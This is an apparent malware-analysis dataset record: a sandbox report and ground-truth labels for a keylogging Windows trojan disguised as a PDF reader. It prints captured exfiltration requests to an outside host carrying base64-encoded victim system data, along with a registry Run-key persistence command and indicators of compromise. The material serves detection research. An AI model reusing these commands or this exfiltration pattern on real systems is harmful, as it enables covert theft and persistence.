# dataset/preprocessed/27e493959250bdb0b50ea00ad428bcd43de7f36e68c8ed5504d497497056048c.json
{
  "hash": "27e493959250bdb0b50ea00ad428bcd43de7f36e68c8ed5504d497497056048c",
  "report_text": "--- NETWORK ACTIVITY ---\n\nHTTP CONVERSATIONS (2):\n  GET http://www.ibayme.eb2a.com/code.php?mode=cb&usr=amFuZXR0ZWRvZQ==&cb=TWFpbE91IEF0IFRoaXMgQ29tcHV0ZXIgTmFtZSA6IFRFUVVJTEFCT09NQk9PTQoJCUxvY2FsIFRpbWUgOiAyMDE5LTExLTI4XzIyOjU4OjE3CgkJT1MgOiBXaW5kb3dzX05UCgkJUFJPQ0VTU09SIElERU5USUZJRVIgOiB4ODYgRmFtaWx5IDYgTW9kZWwgNDUgU3RlcHBpbmcgNywgR2VudWluZUludGVsCgkJTE9HT04gU0VSVkVSIDogXFxURVFVSUxBQk9PTUJPT00KCQlIT01FIERSSVZFIDogQzoKCQlIT01FIFBBVEggOiBcRG9jdW1lbnRzIGFuZCBTZXR0aW5nc1xqYW5ldHRlZG9lCgkJVVNFUiBET01BSU4gOiBURVFVSUxBQk9PTUJPT00KCQlVU0VSIE5BTUUgOiBqYW5ldHRlZG9lCgkJVVNFUiBQUk9GSUxFIDogQzpcRG9jdW1lbnRzIGFuZCBTZXR0aW5nc1xqYW5ldHRlZG9lCgkJQUxMIFVTRVJTIFBST0ZJTEUgOiBDOlxEb2N1bWVudHMgYW5kIFNldHRpbmdzXEFsbCBVc2VycwoJCVdJTkRPV1MgRElSIDogQzpcV0lORE9XUwoJCUNPTSBTUEVDIDogQzpcV0lORE9XU1xzeXN0ZW0zMlxjbWQuZXhlCgkJUEFUSCBFWFQgOiAuQ09NOy5FWEU7LkJBVDsuQ01EOy5WQlM7LlZCRTsuSlM7LkpTRTsuV1NGOy5XU0gKCQlQZWFjZSBPbiBZb3UuCg==  UA: Mozilla/5.0 (Windows; U; Windows NT 5.1; ar; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5\n  GET http://www.ibayme.eb2a.com/code.php?mode=cb&usr=YWRtaW4=&cb=TWFpbE91IEF0IFRoaXMgQ29tcHV0ZXIgTmFtZSA6IFVTRVItUEMKCQlMb2NhbCBUaW1lIDogMjAxOS0xMS0yOV8wNjowNjoyNwoJCU9TIDogV2luZG93c19OVAoJCVBST0NFU1NPUiBJREVOVElGSUVSIDogSW50ZWw2NCBGYW1pbHkgNiBNb2RlbCA2MCBTdGVwcGluZyAxLCBHZW51aW5lSW50ZWwKCQlMT0dPTiBTRVJWRVIgOiBcXFVTRVItUEMKCQlIT01FIERSSVZFIDogQzoKCQlIT01FIFBBVEggOiBcVXNlcnNcYWRtaW4KCQlVU0VSIERPTUFJTiA6IFVTRVItUEMKCQlVU0VSIE5BTUUgOiBhZG1pbgoJCVVTRVIgUFJPRklMRSA6IEM6XFVzZXJzXGFkbWluCgkJQUxMIFVTRVJTIFBST0ZJTEUgOiBDOlxQcm9ncmFtRGF0YQoJCVdJTkRPV1MgRElSIDogQzpcV2luZG93cwoJCUNPTSBTUEVDIDogQzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlCgkJUEFUSCBFWFQgOiAuQ09NOy5FWEU7LkJBVDsuQ01EOy5WQlM7LlZCRTsuSlM7LkpTRTsuV1NGOy5XU0g7Lk1TQwoJCVBlYWNlIE9uIFlvdS4K\n\nDNS LOOKUPS (3):\n  11776.BODIS.com \u2192 199.59.242.153\n  www.ibayme.eb2a.com\n  www.ibayme.eb2a.com \u2192 199.59.242.153\n\nIP TRAFFIC (1):\n  199.59.242.153:80 (TCP)\n\n--- EXECUTION CHAIN ---\n\nPROCESS TREE:\n  ****.exe\n    ashcv.exe\n      com7.exe\n      com7.exe\n      com7.exe\n      com7.exe\n      com7.exe\n    com7.exe\n      ashcv.exe\n      reg.exe ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /t REG_SZ /v COM_LOADER /d \"\\\\.\\program Files\\PDF_Reader\\bin\\COM7.EXE\"\n\nCOMMAND EXECUTIONS (9):\n  (Open) C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\.bat(null) [c:\\]\n  (Open) C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\vmcis.exe/stext C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\vmcis.txt\"\" [c:\\]\n  (Open) REGADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /t REG_SZ /v COM_LOADER /d \\\\.\\C:\\Program Files\\PDF_Reader\\bin\\COM7.EXE\"\" [c:\\]\n  C:\\Users\\<USER>\\AppData\\Local\\Temp\\Rar$EX7.sr77\\vmcis.exe /stext \"C:\\Users\\<USER>\\AppData\\Local\\Temp\\Rar$EX7.sr77\\vmcis.txt\"\n  REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /t REG_SZ /v COM_LOADER /d \"\\\\.\\C:\\Program Files\\PDF_Reader\\bin\\COM7.EXE\"\n  \"C:\\WINDOWS\\system32\\REG.exe\" ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /t REG_SZ /v COM_LOADER /d \"\\\\.\\D:\\Program Files\\PDF_Reader\\bin\\COM7.EXE\"\n  \\\\.\\C:\\Users\\Petra\\AppData\\Local\\Temp\\Rar$EX7.sr77\\ashcv.exe\n  cmd /c \"\"C:\\Users\\Petra\\AppData\\Local\\Temp\\.bat\" \"\n  \\\\.\\C:\\Users\\Petra\\AppData\\Local\\Temp\\Rar$EX7.sr77\\COM7.EXE\n\n--- CAPABILITIES (CAPA) ---\n\nTECHNIQUE TRIGGERS (16):\n  - set file attributes\n  - get startup folder\n  - contain obfuscated stackstrings\n  - query environment variable\n  - get disk information\n  - enumerate processes\n  - get common file path\n  - query or enumerate registry value\n  - get hostname\n  - get socket status\n  - log keystrokes via application hook\n  - log keystrokes via polling\n  - link function at runtime on Windows\n  - check if file exists\n  - reference Base64 string\n  - reference anti-VM strings targeting VMWare\n\nCAPA RULE MATCHES (MBC):\n  - reference absolute stream path on Windows\n  - File System::Create File [C0016]\n  - Process::Create Thread [C0038]\n  - File System::Set File Attributes [C0050]\n  - Process::Create Process [C0017]\n  - get startup folder\n  - Operating System::Registry::Create Registry Key [C0036.004]\n  - Operating System::Registry::Open Registry Key [C0036.003]\n  - Communication::Socket Communication::Create TCP Socket [C0001.011]\n  - File System::Get File Attributes [C0049]\n  - Anti-Static Analysis::Executable Code Obfuscation::Argument Obfuscation [B0032.020]\n  - Anti-Static Analysis::Executable Code Obfuscation::Stack Strings [B0032.017]\n  - contain loop\n  - Discovery::System Information Discovery [E1082]\n  - File System::Read File [C0051]\n  - enumerate processes\n  - Discovery::File and Directory Discovery [E1083]\n  - Operating System::Registry::Query Registry Value [C0036.006]\n  - File System::Create Directory [C0046]\n  - Communication::Socket Communication::Initialize Winsock Library [C0001.009]\n  - Communication::DNS Communication::Resolve [C0011.001]\n  - Communication::Socket Communication::Connect Socket [C0001.004]\n  - Communication::Socket Communication::TCP Client [C0001.008]\n  - Communication::Socket Communication::Get Socket Status [C0001.012]\n  - Communication::Socket Communication::Receive Data [C0001.006]\n\nHIGHLIGHTED CALLS:\n  SetWindowsHookExA\n\n--- ARTIFACTS ---\n\nFILES DROPPED (5):\n  ashcv.exe  [sha256: df2ce1cc7c9b0b69...]\n  PDF Reader Launcher.exe  [sha256: 5de72997ac87ab8b...]\n  PDF_Reader.exe  [sha256: 5c11a64c3d4d3d69...]\n  C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PDF Reader Launcher.exe  [sha256: aab22081772c327b...]\n  \\Users\\Petra\\AppData\\Local\\Temp\\Rar$EX7.sr77\\ashcv.exe  [sha256: 2cf5e709fd975295...]\n\nFILES WRITTEN (19):\n  .\\C:\\Program Files\\PDF_Reader\\bin\\COM7.EXE\n  .\\C:\\Users\\<USER>\\AppData\\Local\\Temp\\Rar$EX7.sr77\\COM7.EXE\n  C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\.bat\n  C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\pipe.Ex77.tmp\n  C:\\DiskD\\Program Files\\PDF_Reader\\PDF_Reader.exe\n  C:\\DiskD\\Program Files\\PDF_Reader\\bin\\COM7.EXE\n  C:\\Documents and Settings\\<USER>\\Start Menu\\Programs\\Startup\\PDF Reader Launcher.exe\n  C:\\Documents and Settings\\Administrator\\Local Settings\\Temp\\Rar$EX7.sr77\\COM7.EXE\n  C:\\Documents and Settings\\Administrator\\Local Settings\\Temp\\Rar$EX7.sr77\\ashcv.exe\n  C:\\Documents and Settings\\Administrator\\Local Settings\\Temp\\Rar$EX7.sr77\\pipe.Ex77.tmp\n  C:\\Documents and Settings\\Administrator\\\u300c\u5f00\u59cb\u300d\u83dc\u5355\\\u7a0b\u5e8f\\\u542f\u52a8\\PDF Reader Launcher.exe\n  C:\\Users\\<USER>\\AppData\\Local\\Temp\\.bat\n  C:\\Users\\<USER>\\AppData\\Local\\Temp\\Rar$EX7.sr77\\COM7.EXE\n  C:\\Users\\<USER>\\AppData\\Local\\Temp\\Rar$EX7.sr77\\ashcv.exe\n  C:\\Users\\<USER>\\AppData\\Local\\Temp\\Rar$EX7.sr77\\pipe.Ex77.tmp\n  \\\\.\\C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\COM7.EXE\n  \\\\.\\C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\ashcv.exe\n  \\\\.\\C:\\Program Files\\PDF_Reader\\PDF_Reader.exe\n  \\\\.\\C:\\Program Files\\PDF_Reader\\bin\\COM7.EXE\n\nPERSISTENCE REGISTRY KEYS (2):\n  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\COM_LOADER = \\\n  \\REGISTRY\\USER\\S-1-5-21-1482476501-1645522239-1417001333-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\COM_LOADER = \\\\.\\D:\\Program Files\\PDF_Reader\\bin\\COM7.EXE\u0000\n\nOTHER REGISTRY KEYS SET (5):\n  HKCU\\Software\\Microsoft\\winsvc\\winsvc\n  \\REGISTRY\\USER\\S-1-5-21-1482476501-1645522239-1417001333-500\\Software\\Microsoft\\winsvc\\winsvc\n  \\REGISTRY\\USER\\S-1-5-21-1482476501-1645522239-1417001333-500\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache\\C:\\WINDOWS\\\n  \\REGISTRY\\USER\\S-1-5-21-3616907901-860437140-2684471051-1001\\HexStream = 53006F006600740077006100720065005C004D006900630\n  \\REGISTRY\\USER\\S-1-5-21-3616907901-860437140-2684471051-1001\\HexStream = 53006F006600740077006100720065005C004D006900630\n\nMUTEXES CREATED (15):\n  CTF.Asm.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500\n  CTF.Compart.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500\n  CTF.LBES.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500\n  CTF.Layouts.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500\n  CTF.TMD.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500\n  CTF.TimListCache.FMPDefaultS-1-5-21-1482476501-1645522239-1417001333-500MUTEX.DefaultS-1-5-21-1482476501-1645522239-1417001333-500\n  Local\\ZoneAttributeCacheCounterMutex\n  Local\\ZonesCacheCounterMutex\n  Local\\ZonesCounterMutex\n  Local\\ZonesLockedCacheCounterMutex\n\nPROCESSES CREATED (9):\n  C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\.bat\" \"\n  C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\eGfpWdeF.exe\n  C:\\WINDOWS\\system32\\REG.exe C:\\WINDOWS\\system32\\REG.exe\" ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /t REG_SZ /v COM_LOADER /d \"\\\\.\\C:\\Program Files\\PDF_Reader\\bin\\COM7.EXE\"\"\n  C:\\WINDOWS\\system32\\reg.exe\n  COM7.EXE\n  \\\\.\\C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\COM7.EXE\n  \\\\.\\C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\ashcv.exe\n  ashcv.exe\n  cmd.exe\n\n--- FILE IDENTITY ---\n\nPE IMPORTS (DANGEROUS):\n  KERNEL32.dll: CreateProcessA, GetProcAddress\n\nCERTIFICATE INFO:\n\nCOMPILER AND PACKER:\n  Packers: {'PEiD': 'MingWin32 v?.? (h)'}\n\nPE SECTIONS (entropy):\n  .text        entropy=5.72\n  .data        entropy=3.51\n  .rdata       entropy=4.58\n  .bss         entropy=0.0\n  .edata       entropy=0.66\n  .idata       entropy=4.84\n  .reloc       entropy=6.42\n  .rsrc        entropy=6.59\n  [overlay]    entropy=6.654158115386963  size=224529\n",
  "ground_truth": {
    "hash": "27e493959250bdb0b50ea00ad428bcd43de7f36e68c8ed5504d497497056048c",
    "verdict": "MALICIOUS",
    "detection_rate": 0.9306,
    "malicious_count": 67,
    "popular_threat_category": [],
    "popular_threat_name": [],
    "suggested_label": null,
    "av_family_vote": "win32",
    "has_family_label": false,
    "ttps": [
      {
        "id": "T1012",
        "signature_description": "query or enumerate registry value"
      },
      {
        "id": "T1016",
        "signature_description": "get socket status"
      },
      {
        "id": "T1027",
        "signature_description": "contain obfuscated stackstrings"
      },
      {
        "id": "T1056",
        "signature_description": "log keystrokes via application hook"
      },
      {
        "id": "T1057",
        "signature_description": "enumerate processes"
      },
      {
        "id": "T1082",
        "signature_description": "query environment variable"
      },
      {
        "id": "T1083",
        "signature_description": "get common file path"
      },
      {
        "id": "T1129",
        "signature_description": "link function at runtime on Windows"
      },
      {
        "id": "T1222",
        "signature_description": "set file attributes"
      },
      {
        "id": "T1497",
        "signature_description": "reference anti-VM strings targeting VMWare"
      },
      {
        "id": "T1518",
        "signature_description": "enumerate processes"
      },
      {
        "id": "T1547",
        "signature_description": "get startup folder"
      }
    ],
    "capa_sig_names": [
      "reference absolute stream path on Windows",
      "create or open file",
      "create thread",
      "set file attributes",
      "create process on Windows",
      "get startup folder",
      "create or open registry key",
      "create TCP socket",
      "get file attributes",
      "contain obfuscated stackstrings",
      "contain loop",
      "query environment variable",
      "read file on Windows",
      "get disk information",
      "enumerate processes",
      "get common file path",
      "query or enumerate registry value",
      "create directory",
      "initialize Winsock library",
      "resolve DNS",
      "connect TCP socket",
      "act as TCP client",
      "get hostname",
      "get socket status",
      "receive data on socket",
      "receive data",
      "send data on socket",
      "send data",
      "set application hook",
      "log keystrokes via application hook",
      "log keystrokes via polling",
      "reference HTTP User-Agent string",
      "write file on Windows",
      "link function at runtime on Windows",
      "check if file exists",
      "contain a resource (.rsrc) section",
      "reference Base64 string",
      "reference anti-VM strings targeting VMWare"
    ],
    "iocs": {
      "ips": [
        "199.59.242.153"
      ],
      "domains": [
        "11776.bodis.com",
        "www.ibayme.eb2a.com"
      ],
      "urls": [
        "http://www.ibayme.eb2a.com/code.php?mode=cb&usr=YWRtaW4=&cb=TWFpbE91IEF0IFRoaXMgQ29tcHV0ZXIgTmFtZSA6IFVTRVItUEMKCQlMb2NhbCBUaW1lIDogMjAxOS0xMS0yOV8wNjowNjoyNwoJCU9TIDogV2luZG93c19OVAoJCVBST0NFU1NPUiBJREVOVElGSUVSIDogSW50ZWw2NCBGYW1pbHkgNiBNb2RlbCA2MCBTdGVwcGluZyAxLCBHZW51aW5lSW50ZWwKCQlMT0dPTiBTRVJWRVIgOiBcXFVTRVItUEMKCQlIT01FIERSSVZFIDogQzoKCQlIT01FIFBBVEggOiBcVXNlcnNcYWRtaW4KCQlVU0VSIERPTUFJTiA6IFVTRVItUEMKCQlVU0VSIE5BTUUgOiBhZG1pbgoJCVVTRVIgUFJPRklMRSA6IEM6XFVzZXJzXGFkbWluCgkJQUxMIFVTRVJTIFBST0ZJTEUgOiBDOlxQcm9ncmFtRGF0YQoJCVdJTkRPV1MgRElSIDogQzpcV2luZG93cwoJCUNPTSBTUEVDIDogQzpcV2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlCgkJUEFUSCBFWFQgOiAuQ09NOy5FWEU7LkJBVDsuQ01EOy5WQlM7LlZCRTsuSlM7LkpTRTsuV1NGOy5XU0g7Lk1TQwoJCVBlYWNlIE9uIFlvdS4K",
        "http://www.ibayme.eb2a.com/code.php?mode=cb&usr=amFuZXR0ZWRvZQ==&cb=TWFpbE91IEF0IFRoaXMgQ29tcHV0ZXIgTmFtZSA6IFRFUVVJTEFCT09NQk9PTQoJCUxvY2FsIFRpbWUgOiAyMDE5LTExLTI4XzIyOjU4OjE3CgkJT1MgOiBXaW5kb3dzX05UCgkJUFJPQ0VTU09SIElERU5USUZJRVIgOiB4ODYgRmFtaWx5IDYgTW9kZWwgNDUgU3RlcHBpbmcgNywgR2VudWluZUludGVsCgkJTE9HT04gU0VSVkVSIDogXFxURVFVSUxBQk9PTUJPT00KCQlIT01FIERSSVZFIDogQzoKCQlIT01FIFBBVEggOiBcRG9jdW1lbnRzIGFuZCBTZXR0aW5nc1xqYW5ldHRlZG9lCgkJVVNFUiBET01BSU4gOiBURVFVSUxBQk9PTUJPT00KCQlVU0VSIE5BTUUgOiBqYW5ldHRlZG9lCgkJVVNFUiBQUk9GSUxFIDogQzpcRG9jdW1lbnRzIGFuZCBTZXR0aW5nc1xqYW5ldHRlZG9lCgkJQUxMIFVTRVJTIFBST0ZJTEUgOiBDOlxEb2N1bWVudHMgYW5kIFNldHRpbmdzXEFsbCBVc2VycwoJCVdJTkRPV1MgRElSIDogQzpcV0lORE9XUwoJCUNPTSBTUEVDIDogQzpcV0lORE9XU1xzeXN0ZW0zMlxjbWQuZXhlCgkJUEFUSCBFWFQgOiAuQ09NOy5FWEU7LkJBVDsuQ01EOy5WQlM7LlZCRTsuSlM7LkpTRTsuV1NGOy5XU0gKCQlQZWFjZSBPbiBZb3UuCg=="
      ],
      "registry_persistence": [
        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\COM_LOADER",
        "\\REGISTRY\\USER\\S-1-5-21-1482476501-1645522239-1417001333-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\COM_LOADER"
      ],
      "registry_all_count": 7,
      "files_dropped": [
        "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PDF Reader Launcher.exe",
        "PDF Reader Launcher.exe",
        "PDF_Reader.exe",
        "\\Users\\Petra\\AppData\\Local\\Temp\\Rar$EX7.sr77\\ashcv.exe",
        "ashcv.exe"
      ],
      "mutexes": [
        "CTF.Asm.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500",
        "CTF.Compart.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500",
        "CTF.LBES.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500",
        "CTF.Layouts.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500",
        "CTF.TMD.MutexDefaultS-1-5-21-1482476501-1645522239-1417001333-500",
        "CTF.TimListCache.FMPDefaultS-1-5-21-1482476501-1645522239-1417001333-500MUTEX.DefaultS-1-5-21-1482476501-1645522239-1417001333-500",
        "Local\\ZoneAttributeCacheCounterMutex",
        "Local\\ZonesCacheCounterMutex",
        "Local\\ZonesCounterMutex",
        "Local\\ZonesLockedCacheCounterMutex",
        "MSCTF.Shared.MUTEX.EBH",
        "ShimCacheMutex",
        "ZonesCacheCounterMutex",
        "ZonesCounterMutex",
        "ZonesLockedCacheCounterMutex"
      ],
      "processes": [
        "C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\.bat\" \"",
        "C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\eGfpWdeF.exe",
        "C:\\WINDOWS\\system32\\REG.exe C:\\WINDOWS\\system32\\REG.exe\" ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /t REG_SZ /v COM_LOADER /d \"\\\\.\\C:\\Program Files\\PDF_Reader\\bin\\COM7.EXE\"\"",
        "C:\\WINDOWS\\system32\\reg.exe",
        "COM7.EXE",
        "\\\\.\\C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\COM7.EXE",
        "\\\\.\\C:\\DOCUME~1\\<USER>~1\\LOCALS~1\\Temp\\Rar$EX7.sr77\\ashcv.exe",
        "ashcv.exe",
        "cmd.exe"
      ]
    }
  },
  "num_sandboxes": 5,
  "sandbox_names": [
    "CAPA",
    "SNDBOX",
    "Tencent HABO",
    "VirusTotal Cuckoofork",
    "VirusTotal Jujubox"
  ]
}